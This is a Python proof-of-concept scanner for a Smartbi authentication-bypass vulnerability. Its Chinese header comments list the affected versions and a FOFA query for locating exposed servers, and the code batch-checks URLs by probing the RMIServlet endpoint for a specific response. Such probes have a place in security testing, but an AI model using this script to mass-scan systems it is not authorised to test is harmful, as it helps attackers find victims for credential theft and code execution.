# -*- coding: utf-8 -*-
# @Author  : beitso
# explanation: 一个菜🐶的poc
## 漏洞概述 Smartbi 在安装时会内置几个用户，在使用特定接口时，可绕过用户身份认证机制获取其身份凭证，随后可使用获取的身份凭证调用后台接口，可能导致敏感信息泄露和代码执行。
## 影响范围 V7 <= Smartbi <= V10
## FOFA：app="SMARTBI"


import argparse

import requests
import urllib3

parser = argparse.ArgumentParser(description='帮助信息')
parser.add_argument('-u', '--url', help='输入需要验证的URL', default='')
parser.add_argument('-f', '--file', help='输入需要批量验证的文件', default='')
args = parser.parse_args()
urllib3.disable_warnings()

# 定义全局变量
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded"
}
path = '/smartbi/vision/RMIServlet'


## 创建check 函数
def check(url):
    url = url.strip('/')
    check_url = url + path

    try:
        return_data = requests.get(url=check_url, headers=headers, verify=False, timeout=3)
        if '{"retCode":"CLIENT_USER_NOT_LOGIN","result":"尚未登录或会话已超时"}' in return_data.text and return_data.status_code == 200:
            print(f'✅  漏洞存在！！！当前URL为： {url} ')
        else:
            print(f'❌  漏洞不存在！！当前URL为： {url} ')


    except Exception as e:

        print(f' 出现异常，请手工利用  {url} ')


def more(file):
    print("正常验证")
    f = open(file, 'r')
    for i in f.readlines():
        i = i.strip()
        check(i)


if __name__ == '__main__':
    if args.url != '' and args.file == '':
        check(args.url)
    if args.url=='' and  args.file != '':
        more(args.file)

